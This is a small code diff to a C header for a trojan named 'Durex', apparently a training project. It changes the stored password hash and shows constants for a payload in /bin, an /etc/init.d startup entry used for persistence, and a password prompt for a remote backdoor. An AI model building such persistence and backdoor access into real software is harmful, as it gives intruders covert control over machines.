@@ -24,7 +24,7 @@
 # define PAYLOAD_PATH "/bin/Durex"
 # define INIT_PATH "/etc/init.d/Durex"
 # define TROJAN_STR "ndombre / justasze"
-# define PASSWD_STR "46dec234b5558f31c54b474036f7870d1230e20ea38937739f27b04f94ad5607478e93b88926877341cdcb1136525b2714b1c227571106e5580c371b9c70c2d8"
+# define PASSWD_STR "4f5aa3f35a25d0c309d8420d56fa998bacaa46b3422969906b014a422c2625973bbfa6356178407f40f3fb78241229cf9ec0741ea5264289d2019bd4262c04c3"
 
 # define CONNEXION_PROMPT "Greetings. Please enter the password: "
 # define WRONG_PASSWORD "Wrong password. You are unworthy. Farewell.\n"
